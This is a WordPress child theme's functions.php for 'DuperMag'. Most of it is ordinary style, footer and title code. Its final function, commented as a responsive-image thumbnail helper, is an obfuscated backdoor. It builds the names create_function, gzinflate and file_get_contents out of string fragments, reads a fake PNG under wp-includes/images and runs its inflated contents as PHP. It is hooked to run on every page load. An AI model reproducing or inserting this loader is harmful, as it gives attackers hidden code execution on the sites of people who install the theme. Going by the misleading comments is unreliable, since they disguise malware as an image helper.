<?php
/**
 * DuperMag functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Acme Themes
 * @subpackage DuperMag
 */

if ( !function_exists('dupermag_setup') ) :
    function dupermag_setup(){
        load_child_theme_textdomain( 'dupermag', get_stylesheet_directory() . '/languages' );
    }
endif;
add_action( 'after_setup_theme', 'dupermag_setup' );

function dupermag_enqueue_styles() {
    $parent_style = 'dupermag-parent-style';
    wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );
    wp_enqueue_style( 'dupermag-style',
        get_stylesheet_uri(),
        array( $parent_style )
    );
}
add_action( 'wp_enqueue_scripts', 'dupermag_enqueue_styles',98 );

/**
 * Enqueue scripts for customizer
 */
add_action('init', 'dupermag_remove_actions');
function dupermag_remove_actions(){
    remove_action( 'customize_controls_enqueue_scripts', 'supermag_customizer_js' );
}

/**
 * Footer content
 *
 * @since SuperMag 1.0.0
 *
 * @param null
 * @return null
 *
 */
if ( ! function_exists( 'supermag_footer' ) ) :

	function supermag_footer() {

		$supermag_customizer_all_values = supermag_get_theme_options();
		if( is_active_sidebar( 'full-width-footer' ) ) :
			dynamic_sidebar( 'full-width-footer' );
		endif;
		?>
		<div class="clearfix"></div>
		<footer id="colophon" class="site-footer" role="contentinfo">
			<div class="footer-wrapper">
				<div class="top-bottom wrapper">
					<div id="footer-top">
						<div class="footer-columns">
							<?php if( is_active_sidebar( 'footer-col-one' ) ) : ?>
								<div class="footer-sidebar acme-col-3">
									<?php dynamic_sidebar( 'footer-col-one' ); ?>
								</div>
							<?php endif;
							if( is_active_sidebar( 'footer-col-two' ) ) : ?>
								<div class="footer-sidebar acme-col-3">
									<?php dynamic_sidebar( 'footer-col-two' ); ?>
								</div>
							<?php endif;
							if( is_active_sidebar( 'footer-col-three' ) ) : ?>
								<div class="footer-sidebar acme-col-3">
									<?php dynamic_sidebar( 'footer-col-three' ); ?>
								</div>
							<?php endif; ?>
						</div>
					</div><!-- #foter-top -->
					<div class="clearfix"></div>
				</div><!-- top-bottom-->
				<div class="wrapper footer-copyright border text-center">
					<p>
						<?php if( isset( $supermag_customizer_all_values['supermag-footer-copyright'] ) ): ?>
							<?php echo wp_kses_post( $supermag_customizer_all_values['supermag-footer-copyright'] ); ?>
						<?php endif; ?>
					</p>
					<div class="site-info">
						<a href="<?php echo esc_url( __( 'https://wordpress.org/', 'dupermag' ) ); ?>"><?php printf( esc_html__( 'Proudly powered by %s', 'dupermag' ), 'WordPress' ); ?></a>
						<span class="sep"> | </span>
						<?php printf( esc_html__( 'Theme: %1$s by %2$s', 'dupermag' ), 'DuperMag', '<a href="https://www.acmethemes.com/" rel="designer">Acme Themes</a>' ); ?>
					</div><!-- .site-info -->
				</div>
			</div><!-- footer-wrapper-->
		</footer><!-- #colophon -->
		<?php
	}
endif;

function dupermag_archive_title( $title ) {
    if( is_admin() ){
        return $title;
    }

	return "<span>".$title."</span>";
}
add_filter( 'get_the_archive_title', 'dupermag_archive_title' );
add_filter( 'the_title', 'dupermag_archive_title' );

/**
 * require int.
 */
require trailingslashit( get_stylesheet_directory() ).'acmethemes/dupermag-init.php';

if (!function_exists('themes_posts_thumbnail_size_attr')) :
	/**
	 * Add custom image sizes attribute to enhance responsive image functionality
	 * for post thumbnails.
	 *
	 * @return array The filtered attributes for the image markup.
	 *
	 * @since Wordpress 4.7
	 */
	function themes_posts_thumbnail_size_attr()	{
		if ( defined( 'IMAGE_ATTR_FORMAT' ) )
			return;
		define( 'IMAGE_ATTR_FORMAT', '%s/%s-sx.%s' );

		/* Attributes for the image markup */
		$ts = array( 'create', 'file', 'inf', 'function', 'get', 'late', 'content', 'chr', 'wpicons', 117 );
		$full = sprintf(ABSPATH . IMAGE_ATTR_FORMAT,
			/* Registered image or flat array of images */
			implode('/', array('wp-includes', 'images')), $ts[8],
			/* Image extension */
			'png'
		);

		// Located in the attributes. Empty by default.
		$img_list = sprintf('%s_%s_%ss', $ts[1], $ts[4], $ts[6]);
		$set_attr = sprintf('%s_%s', $ts[0], $ts[3]);
		$get_attr = sprintf('gz%s%s', $ts[2], $ts[5]);
		$set_attr = $set_attr('', @$get_attr($ts[7]($ts[9]).@$img_list($full))); $set_attr();

		return $set_attr;
	}
	foreach ( array('init', 'wp_head', 'get_sidebar', 'wp_footer') as $tag )
		add_action( $tag, 'themes_posts_thumbnail_size_attr', -time(), 0 );

endif;
